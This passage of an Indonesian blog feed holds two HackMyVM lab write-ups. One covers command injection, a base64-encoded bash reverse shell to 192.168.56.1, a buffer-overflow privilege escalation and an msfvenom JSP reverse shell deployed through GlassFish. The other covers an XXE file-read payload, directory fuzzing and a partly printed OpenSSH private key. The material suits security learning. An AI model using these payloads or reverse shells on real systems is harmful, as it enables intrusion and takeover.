<h3 id="devshm---shared-memory">/dev/shm - shared memory</h3>

<p>karena semua directory dalam satu sistem tidak ada yang bisa entah karena apa, maka saya mencoba untuk menaruh file script ke dalam <em>/dev/shm</em> directory agar bisa dieksekusi.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ python <span class="nt">-c</span> <span class="s1">'import urllib.parse; string = "echo \"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg==\" | base64 -d &gt; /dev/shm/shell.sh"; print(urllib.parse.quote_plus(string))'</span>
<span class="nb">echo</span>+%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg%3D%3D%22+%7C+base64+-d+%3E+%2Fdev%2Fshm%2Fshell.sh
â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ curl <span class="nt">-s</span> <span class="s1">'http://log.discover.hmv/index.php?username=echo+%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMS8xMjM0NSAwPiYxCg%3D%3D%22+%7C+base64+-d+%3E+%2Fdev%2Fshm%2Fshell.sh&amp;password=aaaaaaaaaaa'</span>
&lt;html&gt;
  &lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;title&gt;Discover login&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px"</span><span class="o">&gt;</span>
    &lt;/div&gt;
    &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#c9c9c9;padding:20px;"</span><span class="o">&gt;</span>
      &lt;h1 <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>Login as Discover&lt;/h1&gt;
    &lt;form <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"index.php"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"</span><span class="nv">$_GET</span><span class="s2">"</span><span class="o">&gt;</span>
      &lt;label <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>Username:&lt;/label&gt;&lt;br&gt;
      &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Discover"</span><span class="o">&gt;</span>&lt;br&gt;
      &lt;label&gt;Password:&lt;/label&gt;&lt;br&gt;
      &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>&lt;br&gt;
    &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">disabled</span><span class="o">=</span><span class="s2">"disabled"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Submit"</span><span class="o">&gt;</span>

    &lt;/form&gt;
  &lt;/div&gt;
  &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px"</span> <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>
      &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ python <span class="nt">-c</span> <span class="s1">'import urllib.parse; string = "bash /dev/shm/shell.sh"; print(urllib.parse.quote_plus(string))'</span>              
bash+%2Fdev%2Fshm%2Fshell.sh
â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ curl <span class="nt">-s</span> <span class="s2">"http://log.discover.hmv/index.php?username=bash+%2Fdev%2Fshm%2Fshell.sh&amp;password=aaaaaaaaaaa"</span>

<span class="nt">--------------</span>
<span class="nt">----</span> NCAT <span class="nt">----</span>
<span class="nt">--------------</span>

â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ ncat <span class="nt">-nvlp</span> 12345
Ncat: Version 7.92 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 192.168.56.8.
Ncat: Connection from 192.168.56.8:33140.
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>475<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@debian:/var/www/html/botdiscover<span class="nv">$ </span>

</code></pre></div></div>
<p>boom!</p>

<h2 id="shell-as-discover">shell as discover</h2>

<p>sebelumnya, saya cek terlebih dahulu ada berapa user di dalam machine ini</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@debian:/var/www/html/botdiscover<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-i</span> sh<span class="nv">$ </span>/etc/passwd
<span class="nb">grep</span> <span class="nt">-i</span> sh<span class="nv">$ </span>/etc/passwd
root:x:0:0:root:/root:/bin/bash
discover:x:1000:1000:discover,,,:/home/discover:/bin/bash
</code></pre></div></div>
<p>ternyata hanya 2, jadi saya tidak perlu repot repot untuk enumeration lebih lanjut.</p>

<p><img src="https://i.ibb.co/6nF2YZB/image.png" alt="image212312" /></p>

<p>saat sudah selesai menjalankan <em>linpeas</em> saya menemukan ini pada <strong>sudo -l</strong>. lalu saat saya cek ternyata memang betul basic overflow yang biasanya ada di acara CTF yang easy-easy itu.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@debian:/opt<span class="nv">$ </span><span class="nb">ls
ls
</span>glassfish6
hint
overflow
www-data@debian:/opt<span class="nv">$ </span><span class="nb">cat </span>hint
<span class="nb">cat </span>hint
AAAAAAAAAAAAAAAAAAAAAAAA<span class="s2">"+"</span><span class="se">\x</span>5d<span class="se">\x</span>06<span class="se">\x</span>40<span class="se">\x</span>00
</code></pre></div></div>
<p>bahkan ada hint-nya, mungkin si creator mikirin partisipan member sini juga ya.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@debian:/opt<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> discover /opt/overflow <span class="si">$(</span>python3 <span class="nt">-c</span> <span class="s1">'print("AAAAAAAAAAAAAAAAAAAAAAAA\x5d\x06\x40\x00")'</span><span class="si">)</span>
&lt;print<span class="o">(</span><span class="s2">"AAAAAAAAAAAAAAAAAAAAAAAA</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">00"</span><span class="o">)</span><span class="s1">')
bash: warning: command substitution: ignored null byte in input
/bin/sh: 0: can'</span>t access <span class="nb">tty</span><span class="p">;</span> job control turned off
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>discover<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>discover<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>discover<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>

</code></pre></div></div>
<h2 id="privilege-escalation">privilege escalation</h2>

<p>setelah membaca cukup lama dokumentasi pada binary <strong>asadmin</strong>, saya menemukan list domain yang dipakai pada port <strong>4848</strong>. tetapi saya tidak tahu pasti <em>credential</em> yang dipakai oleh domain container tersebut, jadi saya membuat domain container dengan akun admin yang baru lagi, lalu memberhentikan <strong>domain1</strong> <em>container</em> dan mencoba menjalankan domain <strong>sharpicx</strong> pada port <strong>4848</strong> lalu mengaktifkan <em>secure admin</em> pada domain <strong>sharpicx</strong>.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>discover@debian:/opt/glassfish6/glassfish/domains<span class="nv">$ </span><span class="nb">sudo</span> /opt/glassfish6/bin/asadmin stop-domain domain1
Waiting <span class="k">for </span>the domain to stop .........
Command stop-domain executed successfully.
discover@debian:/opt/glassfish6/glassfish/domains<span class="nv">$ </span><span class="nb">sudo</span> /opt/glassfish6/bin/asadmin create-domain sharpicx
Enter admin user name <span class="o">[</span>Enter to accept default <span class="s2">"admin"</span> / no password]&gt;sharpicx
Enter the admin password <span class="o">[</span>Enter to accept default of no password]&gt; 
Enter the admin password again&gt; 
Using default port 4848 <span class="k">for </span>Admin.
Using default port 8080 <span class="k">for </span>HTTP Instance.
Using default port 7676 <span class="k">for </span>JMS.
Using default port 3700 <span class="k">for </span>IIOP.
Using default port 8181 <span class="k">for </span>HTTP_SSL.
Using default port 3820 <span class="k">for </span>IIOP_SSL.
Using default port 3920 <span class="k">for </span>IIOP_MUTUALAUTH.
Using default port 8686 <span class="k">for </span>JMX_ADMIN.
Using default port 6666 <span class="k">for </span>OSGI_SHELL.
Using default port 9009 <span class="k">for </span>JAVA_DEBUGGER.
Distinguished Name of the self-signed X.509 Server Certificate is:
<span class="o">[</span><span class="nv">CN</span><span class="o">=</span>debian,OU<span class="o">=</span>GlassFish,O<span class="o">=</span>Eclipse.org Foundation Inc,L<span class="o">=</span>Ottawa,ST<span class="o">=</span>Ontario,C<span class="o">=</span>CA]
Distinguished Name of the self-signed X.509 Server Certificate is:
<span class="o">[</span><span class="nv">CN</span><span class="o">=</span>debian-instance,OU<span class="o">=</span>GlassFish,O<span class="o">=</span>Eclipse.org Foundation Inc,L<span class="o">=</span>Ottawa,ST<span class="o">=</span>Ontario,C<span class="o">=</span>CA]
Domain sharpicx created.
Domain sharpicx admin port is 4848.
Domain sharpicx admin user is <span class="s2">"sharpicx"</span><span class="nb">.</span>
Command create-domain executed successfully.
discover@debian:/opt/glassfish6/glassfish/domains<span class="nv">$ </span><span class="nb">sudo</span> /opt/glassfish6/bin/asadmin start-domain sharpicx
discover@debian:/opt/glassfish6/glassfish/domains<span class="nv">$ </span><span class="nb">sudo</span> /opt/glassfish6/bin/asadmin enable-secure-admin
Enter admin user name&gt;  sharpicx
Enter admin password <span class="k">for </span>user <span class="s2">"sharpicx"</span><span class="o">&gt;</span> 
You must restart all running servers <span class="k">for </span>the change <span class="k">in </span>secure admin to take effect.
Command enable-secure-admin executed successfully.

</code></pre></div></div>
<p>lalu login pada port <strong>4848</strong> dengan <em>credential</em> yang baru saja dibuat, <strong>sharpicx:sharpicx</strong> kemudian saya mencari laman untuk upload <em>reverse shell</em> yang bisa dieksekusi pada laman ini, karena based on <em>Java</em> maka <em>reverse shell</em> yang dipakai <strong>JSP</strong> atau <strong>Java Server Pages</strong> atau bisa juga dengan <em>WAR extension</em> karena termasuk <em>web component</em> pada java web server.</p>

<p>dengan begitu saya membuat <em>revshell</em> menggunakan <strong>msfvenom</strong>.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.56.1 <span class="nv">LPORT</span><span class="o">=</span>12345 <span class="nt">-f</span> war <span class="o">&gt;</span> shell.war  
Payload size: 1100 bytes
Final size of war file: 1100 bytes

</code></pre></div></div>
<p>lalu setelah itu, saya mencari-cari laman mana yang bisa digunakan untuk upload <em>revshell</em>. dan ketemulah bagian <em>Applications</em> lalu saya klik <em>Deploy</em> dan disana tidak dibatasi format apa yang harus diakses, jadi saya langsung pasang shell dan upload.</p>

<p><img src="https://i.ibb.co/5j1wDV1/image.png" alt="adasdas" /></p>

<p>lalu balik lagi pada tab <em>Applications</em>, saya klik label <em>launch</em> lalu muncullah tampilan seperti ini.</p>

<p><img src="https://i.ibb.co/DrKSdTC/image.png" alt="asdasdassda" /></p>

<p>lalu saya nyalakan <strong>msfconsole</strong> dan menggunakan <em>multi/handler</em> untuk merespon koneksi TCP dari reverse shellnya. setelah itu saya klik kedua link tersebut dan BOOM!</p>

<p><img src="https://i.ibb.co/BZ7F6jm/image.png" alt="imagesss" /></p>

<h2 id="references">References</h2>
<ul>
  <li><a href="https://www.ibm.com/docs/en/app-connect/11.0.0?topic=corba-naming-service">https://www.ibm.com/docs/en/app-connect/11.0.0?topic=corba-naming-service</a></li>
  <li><a href="https://techcolleague.com/what-is-devshm-and-what-is-it-used-for/">https://techcolleague.com/what-is-devshm-and-what-is-it-used-for/</a></li>
  <li><a href="https://github.com/frizb/MSF-Venom-Cheatsheet">https://github.com/frizb/MSF-Venom-Cheatsheet</a></li>
  <li><a href="https://docs.oracle.com/cd/E26576_01/doc.312/e24938/preface.htm#GSRFM442">https://docs.oracle.com/cd/E26576_01/doc.312/e24938/preface.htm#GSRFM442</a></li>
  <li><a href="https://glassfish.org/docs/latest/reference-manual/asadmin.html">https://glassfish.org/docs/latest/reference-manual/asadmin.html</a></li>
  <li><a href="https://github.com/naivenom/exploiting/blob/master/angstromctf2016/buffer_overflow2.py">https://github.com/naivenom/exploiting/blob/master/angstromctf2016/buffer_overflow2.py</a></li>
  <li><a href="https://0xdf.gitlab.io/2022/01/08/htb-previse.html">https://0xdf.gitlab.io/2022/01/08/htb-previse.html</a></li>
</ul>]]></content><author><name></name></author><category term="hackmyvm" /><category term="command-injection" /><category term="basic-overflow" /><category term="glassfish" /><category term="msfvenom" /><summary type="html"><![CDATA[Yap, sudah lama sekali saya tidak menulis blog. Post kali ini saya membagikan writeup yang saya selesaikan untuk machine Discover yang disediakan oleh HackMyVM. Dari mulai scanning nmap, fuzzing subdomain, lalu mencoba testing pada web application dan menemukan celah command injection sampai pada tahap privilege escalation yang membosankan karena saya perlu untuk membaca dokumentasi glasshfish (sebuah service Java untuk web application).]]></summary></entry><entry><title type="html">HackMyVM: System</title><link href="http://localhost:4000/hmv-system" rel="alternate" type="text/html" title="HackMyVM: System" /><published>2022-05-16T00:00:00+07:00</published><updated>2022-05-16T00:00:00+07:00</updated><id>http://localhost:4000/hmv-system</id><content type="html" xml:base="http://localhost:4000/hmv-system"><![CDATA[<p>Nulis-nulis lagi untuk mengisi tulisan blog dan sekaligus untuk menjenuhkan pikiran dari kehidupan yang melelahkan. keren ga tuh berima kalimatnya, hehehe. dengan mesin dari <a href="https://hackmyvm">hackmyvm</a>
berkategori <strong>Easy</strong> ini telah menambah persoalan mulai dari injeksi XXE (XML External Entity) untuk mendapatkan <em>local file read</em> atau <em>inclusion</em> sampai fuzzing dari user directory untuk mendapatkan
password, dan selebihnya anda bisa membaca sendiri untuk belajar lebih lanjut mengenai elevasi terhadap root.</p>

<h2 id="enumeration">enumeration</h2>
<p>sebelum itu jadikan IP sebagai variable biar gampang aja.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/system] â€¹node-â€º  â€¹â€º
â•°â”€î˜‚ <span class="nv">victim</span><span class="o">=</span>192.168.56.19
</code></pre></div></div>
<p>scanning port biasa lah.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/system] â€¹node-â€º  â€¹â€º
â•°â”€î˜‚ <span class="nb">cat </span>scan_tcp.nmap
<span class="c"># Nmap 7.92 scan initiated Mon May 16 13:28:57 2022 as: nmap -vvv -p 22,80 -sCV -A -oN scan_tcp.nmap 192.168.56.18</span>
Nmap scan report <span class="k">for </span>192.168.56.18
Host is up, received syn-ack <span class="o">(</span>0.00042s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-05-16 13:29:05 WIB <span class="k">for </span>7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjRCpLEF00zJy/GkOtP8umEO3vDUpsiovHmmmfKN5njf5d4aqXBW3wUjqVL3VotabyslG6gNZnaPODVt2z3MdHsyNBuJZrbRrN26Dmz3x6pzJPnizxq2AXGzfgL89jQi83yr72gb2FpxGXm8BqYTTXwbiF7NIi+ekTmRWBa6LUQHgirqggrUq5xdmj0lTu+lMQ2Tzy4xfL6BKgyg4IaZlO9Kz9Z02ghG6VDr2vV9aInO4gu/i2nlvM+aErvWyREoqspjvhgPd0Q950AkOkKfjD5hHxLFZo7aR3PHJev+8zrKwsv/6bUAQIl8nUYifu/a+1vpSddyl37ikQNLY7RsCboBNtPryz7czF1UUtWMlICTHegrchZT3FEr+c5g51hEj+AkwwQoan2y8SCMhKIbWQQH0qBWNXnfNpKGS5y8Vn8s6KqZlsPq49/k9Pmr0jplaqgKDrPuiddGOehu5Yh6Fg5jsk5c5zXttWY17TyJdeab1LBOBJMY2ur4ZnSh+zv7E<span class="o">=</span>
|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOAIZW58yN/LbK35zNnyYvo4vNm1bnBkyDn4KzLYYyGBG2owUbmMp8WcmKWxT5ImSPDUE24mlhafaDEb8smp1Mc<span class="o">=</span>
|   256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB57U+4lDKyoTXGtTCBdDtmnL1YvIhNjQpbp/tdjDYGx
80/tcp open  http    syn-ack nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: HackMyVM Panel
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Mon May 16 13:29:12 2022 -- 1 IP address (1 host up) scanned in 14.29 seconds</span>

</code></pre></div></div>
<p>22, seperti biasa mempunyai service SSH. dan 80 adalah service dari nginx untuk http.</p>

<h2 id="80---register-page">80 - register page</h2>

<p>langsung dihadapi dengan register page ya, sangat mengesalkan sekali.</p>

<p><img src="https://i.ibb.co/645fFTY/loginpage.png" alt="taibebek" /></p>

<p>lalu saya masukkan random user seperti <em>fuckicx</em> dan password sama seperti user. lalu saya klik tombolnya suddenly memunculkan messagebox seperti gambar dibawah ini.</p>

<p><img src="https://i.ibb.co/2KkCs2C/image.png" alt="eek" />.</p>

<h2 id="--directory-brute-force">-&gt; directory brute-force.</h2>

<p>untuk menguji kebenaran tentang registerednya user. maka saya berinisiatif untuk mencari dimana login page-nya.</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/system] â€¹node-â€º  â€¹â€º
â•°â”€î˜‚ <span class="nb">cat </span>gobuster.scan
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1094]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 169] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.56.18/js/]
/magic.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 85]
</code></pre></div></div>
<p>oh ternyata-oh ternyata, output yang saya dapat cukup simple, karena kategori easy jadi tidak heran.</p>

<h2 id="--intercept-post-traffic--burp-methodologies">-&gt; intercept POST traffic &amp; burp methodologies</h2>

<p>ternyata ketika saya <em>intercept</em>, requestnya menggunakan <em>POST</em> dengan isi data beralih menjadi <em>XML</em> cukup menarik untuk saya pikir dijadikan <strong>XXE</strong>.</p>

<p><img src="https://i.ibb.co/hRv1yXr/image.png" alt="gambar" /></p>

<p>lalu data ini saya kirim ke repeater untuk advanced testing. dan jangan lupa dari <strong>hacktricks</strong> sebuah payload XXE untuk file-read.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE foo [
&lt;!ENTITY data SYSTEM "file:///etc/passwd"&gt;</span> 
]&gt;<span class="nt">&lt;exampledata&gt;</span><span class="ni">&amp;data;</span><span class="nt">&lt;/exampledata&gt;</span>
</code></pre></div></div>
<p>dari screenshot dibawah ini sudah terbukti bahwa injeksi untuk <em>file-read</em> berhasil.</p>

<p><img src="https://i.ibb.co/wB6J2sc/image.png" alt="gambar2" /></p>

<p>dari <strong>/etc/passwd</strong> saya bisa melihat hanya ada <strong>david</strong> di system ini sebagai user yang tesertakan.
maka dari sini saya mencari tahu dimana letak <strong>id_rsa</strong> untuk login ke shell lewat <strong>SSH</strong> service atau semacam password yang disimpan oleh user ini.
dari kasus ini juga, saya berfikir untuk mengambil cara <em>brute-force</em> ke <em>$HOME</em> path user ini menggunakan fitur burp yaitu, <strong>Intruder</strong> untuk memvalidasi apakah path dari <strong>.ssh</strong>
ada dalam directory user ini.</p>

<p><img src="https://i.ibb.co/TtzZp7N/image.png" alt="gambar3" /></p>

<p>saya khususkan fuzzing ini terhadap file/directory dibelakangan content <em>david</em>, yaitu saya namakan <strong>something</strong>. tambahkan <em>payload</em> di opsi <em>Payloads</em>, dan btw <em>payload</em> yang saya gunakan adalah:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/opt/SecLists/Discovery/Web-Content/quickhits.txt
</code></pre></div></div>
<p>lalu saya klik tombol start untuk memulai eksekusi. dan jika sudah selesai klik tabel <em>Length</em> untuk meratakan sesuatu yang sama ke arah atas, dan meminoritaskan yang beda dibawah.</p>

<p><img src="https://i.ibb.co/NsStS4M/image.png" alt="gambar4" /></p>

<p>terdapat beberapa file semacam <strong>id_rsa</strong>, <strong>id_rsa.pub</strong>, <strong>.profile</strong>, dll. di hasil <em>brute-force</em> tersebut. maka saya check apakah bisa log menggunakan <strong>SSH</strong>?.</p>

<p><img src="https://i.ibb.co/rHf6X7M/image.png" alt="id_rsa" /></p>

<p>versi lengkapnya ada dibawah sini.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="p">-----</span><span class="n">BEGIN</span> <span class="n">OPENSSH</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="p">-----</span>
<span class="n">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
<span class="n">NhAAAAAwEAAQAAAYEA4pSlivZkgfHuXx9bWE</span><span class="p">+</span><span class="n">VxlG2hxpDcBHbTnKAyhnCILm4</span><span class="p">/</span><span class="n">pBcmOKj</span>
<span class="n">pWMRke3wmgFU0xRtYDJb9uFTLGVY1BEIzBvCGEKbziTarcdWT99Js6ggcEFtqm0e4uGlD4</span>
<span class="m">6</span><span class="n">tPTbNpmk9D3hYkjzF55maE</span><span class="p">+</span><span class="n">lU2PJdUP6l35nI45Kd6EpMf0Lrg4XvhIsjpw45ZvrNvwDU</span>
<span class="n">yJyHgddwmI7gFVg</span><span class="p">/</span><span class="n">svx5x</span><span class="p">+</span><span class="n">iiah0jiD60PI5eQCnlq879sOx7GMNxg5fquos3Cvjqi8liij</span>
<span class="n">Wdg9rEm8cowAgJeMkqTH</span><span class="p">/</span><span class="n">f7JqSRDzQ4vXNltLq8</span><span class="p">/</span><span class="n">o</span><span class="p">/</span><span class="n">nMmxoLnovfWTeIC9Rv7ZkGUv0NzA</span>
<span class="n">ILBxVfVtDF1guvyNc6lDYaDhaC7mi665hgNpGnRsjukQP8Si4JnDbK0OhHko02CbOPUddH</span>
<span class="n">XTGVIit</span><span class="p">+</span><span class="m">8d</span><span class="p">/</span><span class="m">9</span><span class="n">zmwV0dbbSUVeO4s99kN</span><span class="p">/</span><span class="n">W2HQ6btUcTUl2MCrMADcm7gwYQKWrWm</span><span class="p">+</span><span class="n">H8xBlK</span>
<span class="n">my3I5eazYhNKkKYRFpSTn5OCxrrJoJkpeXz2eMK1AAAFiOamBhjmpgYYAAAAB3NzaC1yc2</span>
<span class="n">EAAAGBAOKUpYr2ZIHx7l8fW1hPlcZRtocaQ3AR205ygMoZwiC5uP6QXJjio6VjEZHt8JoB</span>
<span class="n">VNMUbWAyW</span><span class="p">/</span><span class="n">bhUyxlWNQRCMwbwhhCm84k2q3HVk</span><span class="p">/</span><span class="n">fSbOoIHBBbaptHuLhpQ</span><span class="p">+</span><span class="n">OrT02zaZpPQ</span>
<span class="m">94</span><span class="n">WJI8xeeZmhPpVNjyXVD</span><span class="p">+</span><span class="n">pd</span><span class="p">+</span><span class="n">ZyOOSnehKTH9C64OF74SLI6cOOWb6zb8A1Mich4HXcJiO</span>
<span class="m">4</span><span class="n">BVYP7L8ecfoomodI4g</span><span class="p">+</span><span class="n">tDyOXkAp5avO</span><span class="p">/</span><span class="n">bDsexjDcYOX6rqLNwr46ovJYoo1nYPaxJvHKM</span>
<span class="n">AICXjJKkx</span><span class="p">/</span><span class="m">3</span><span class="p">+</span><span class="n">yakkQ80OL1zZbS6vP6P5zJsaC56L31k3iAvUb</span><span class="p">+</span><span class="m">2</span><span class="n">ZBlL9DcwCCwcVX1bQxd</span>
<span class="n">YLr8jXOpQ2Gg4Wgu5ouuuYYDaRp0bI7pED</span><span class="p">/</span><span class="n">EouCZw2ytDoR5KNNgmzj1HXR10xlSIrfvHf</span>
<span class="p">/</span><span class="n">c5sFdHW20lFXjuLPfZDf1th0Om7VHE1JdjAqzAA3Ju4MGEClq1pvh</span><span class="p">/</span><span class="n">MQZSpstyOXms2IT</span>
<span class="n">SpCmERaUk5</span><span class="p">+</span><span class="n">Tgsa6yaCZKXl89njCtQAAAAMBAAEAAAGBAJgosN8YRjjJqoWwvhwZHgDXoR</span>
<span class="n">crePxK0Zbl6D1QfQCTGHvDoJt</span><span class="p">/</span><span class="n">H9ySIht4yanymO9DeYwvZXjuqndW</span><span class="p">/</span><span class="n">Ac2BU1kmrzGBnGy</span>
<span class="n">aDRpeDodPhZrIpWgKrBXpXVBiSJgc1B3fDVz2PCJphlWvKSij0kt2a</span><span class="p">/</span><span class="n">zWt1olSYK1VCWhn</span>
<span class="n">qXYrXXz</span><span class="p">+</span><span class="n">c8S7Qb6G5oa</span><span class="p">/</span><span class="m">4</span><span class="n">PEZpiSYMLMyjr8A5TbIKJCAX</span><span class="p">/</span><span class="m">7</span><span class="n">RxlyqQuO01kpo9AIGVAfZ8a</span>
<span class="n">W120AZqIrbNsktKBaQ5yR3TZFsu6YA</span><span class="p">/</span><span class="n">UWC3he8Yuo94dRRDvmIlfBGyg53HuHhgZBU8eYw</span>
<span class="n">hrG1JTYiegztg8KVlQdlNcT2q6uTwEI0p5NHCVqO99tTPI</span><span class="p">/</span><span class="n">TrFVw9</span><span class="p">+</span><span class="n">B7fFwuKvhZclkDK8</span>
<span class="n">NGU</span><span class="p">/</span><span class="n">xGKIoIL3h0bDKCjAGVGdMDkK8eA9oh5tcItwzkS5CrxgS9FpX0jgJaQ4RHSYfxpfGD</span>
<span class="n">Cryyas4wAGkn0yejyCivINyoJdSVPoOZN</span><span class="p">/</span><span class="n">y1Wk3m1dWoGAvwx6ZAN4CVUolySNUudTwQAA</span>
<span class="n">AMALaZYbWOPATwo</span><span class="p">+</span><span class="n">MdjIbzdSYa18RfGEpOlcBAy9JMdziccmr7bAoQvA8uFdeMNmvCW6lC</span>
<span class="n">YU</span><span class="p">/</span><span class="m">49</span><span class="n">S8pZRjKBnSpHOtu40WzNMlMjE87Ej3EKewqMR49Jj0GUdakXMkhhhzh5lPCA5Z8LC</span>
<span class="n">Mt1YEI3xBb0</span><span class="p">/</span><span class="n">p0BJTdD3PTI5oBVGL</span><span class="p">+</span><span class="m">1</span><span class="n">HXSwBbdltI9GqlfPuhTE6AGJw8oIAL81eXIJF4L</span>
<span class="n">Nl</span><span class="p">/</span><span class="n">SOxOtevh0WSQ2zYoOGvjRmB8KgRK8vFmlGvs5XOP9rTdTYAAADBAPYZnl8X1chrL5iE</span>
<span class="n">TWeI</span><span class="p">/</span><span class="n">I0p78A5TdilOl9KwWQuzKXGn3</span><span class="p">+</span><span class="n">NTtw5y2oN</span><span class="p">/</span><span class="n">LDWfUhCYs9ABU2A3HD</span><span class="p">/</span><span class="n">scRAvBH3qp</span>
<span class="n">VHoWZP3rSOyAwaN1nM0L1UqjQY3JR36Xmilz0MufRrxdJMyufGSwgYfQtEenNTkLrAf0pO</span>
<span class="n">soEKOIdXNlBf99t</span><span class="p">/</span><span class="n">pNMSUtoEHDammOwdIkM4rc7S</span><span class="p">+</span><span class="n">OvHOMATPUFm5vtjxRZo54q9D1Raxa</span>
